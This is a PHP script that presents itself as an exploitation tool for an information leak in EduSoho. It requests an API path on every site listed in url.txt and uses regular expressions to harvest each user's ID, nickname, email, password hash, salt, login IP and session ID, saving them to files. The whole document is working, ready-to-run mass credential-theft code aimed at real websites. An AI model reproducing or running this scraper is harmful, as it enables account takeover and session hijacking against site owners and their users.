    <?php
set_time_limit(0);
error_reporting(0);
print_r(
"
+------------------------------------+
*      EduSoho 信息泄露利用工具      *
*          By:T0n9@X1a0J1e           *
*           QQ:1692899800            *
*      url.txt是你采集的URL列表！    *
*      结果保存在URL_info.txt里面    *
+------------------------------------+
\r\n"
);
echo "漏洞原理及出处 http://zone.wooyun.org/content/24629  发现者:phith0n\n\n";
echo "请注意你的PHP是否已开启Curl模块\n\n";
@$txt =  file_get_contents('url.txt');
if(!$txt){
    echo "蠢货你的url.txt呢？ 没有请自己新建并放入目标url";
exit();
}
$url = explode("\r\n",$txt);
$cj_uri = "/api/users/1/followings";     //采集路径
//正则获取信息
//需要什么获取什么 不需要路径则注释掉
//部分网站格式不一样  自行更改
for($i = 0;$i < count($url);$i++){
    $urls = curl_init();
    curl_setopt ($urls, CURLOPT_URL, $url[$i].$cj_uri);
    curl_setopt ($urls, CURLOPT_RETURNTRANSFER, 1); //是否显示
    curl_setopt ($urls, CURLOPT_CONNECTTIMEOUT, 5); //超时时间
    $curl_info = curl_exec($urls);
    curl_close($urls);
    $info_array['str'] = array("\r\n","\r","\n");
    $url_info = str_replace($info_array['str'],"",$curl_info);
    preg_match("/http\:\/\/(.*?)\//",$url[$i].$cj_uri,$info_array['url']);
    preg_match("/<li> in (.*?) line /",$url_info,$info_array['uri']);
    preg_match_all("/\('id' => '(.*?)'/",$url_info,$info_array['id']);
    preg_match_all("/'nickname' => '(.*?)'/",$url_info,$info_array['nickname']);
    preg_match_all("/'email' => '(.*?)'/",$url_info,$info_array['email']);
    preg_match_all("/'password' => '(.*?)'/",$url_info,$info_array['password']);
    preg_match_all("/'salt' => '(.*?)'/",$url_info,$info_array['salt']);
    preg_match_all("/'loginIp' => '(.*?)'/",$url_info,$info_array['loginIp']);
    preg_match_all("/'loginSessionId' => '(.*?)'/",$url_info,$info_array['loginSessionId']);
    //获取全部email总数   有多少个email应该就有多少个账号
    $count = count($info_array['email'][1]);
    $urlwz = $info_array['url'][1];
    if($count === 0){
        echo "$url[$i]可能不存在此漏洞！\r\n";continue;
    }else{
        $in = fopen($urlwz."_".$count.'User_info.txt',"a");
    }
    echo "$url[$i]可能存在漏洞 共获取到".$count."个用户\r\n";
    $url_ok  = "目标URL: ".$url[$i]."\r\n";
    $url_ok .= "绝对路径: ".$info_array['uri'][1]."\r\n";
    $url_ok .= "共爬行: ".$count."个用户\r\n\r\n";
        for($s = 0 ;$s < $count;$s++){
            $url_ok .= "ID: ".$info_array['id'][1][$s+1]."\r\n";
            $url_ok .= "用户名: ".$info_array['nickname'][1][$s]."\r\n";
            $url_ok .= "邮箱: ".$info_array['email'][1][$s]."\r\n";
            $url_ok .= "密码: ".$info_array['password'][1][$s]."\r\n";
            $url_ok .= "盐: ".$info_array['salt'][1][$s]."\r\n";
            $url_ok .= "登陆IP: ".$info_array['loginIp'][1][$s]."\r\n";
            $url_ok .= "登陆Session: ".$info_array['loginSessionId'][1][$s]."\r\n";
            $url_ok .= "=======================================================\r\n";;
        }
    if(fwrite($in,$url_ok)){
        echo "$url[$i]内容写出成功 文件保存于$urlwz"."_".$count."User_info.txt\r\n";
    }else{
        echo "$url[$i]内容写出失败！\r\n";
    }
}
 ?>
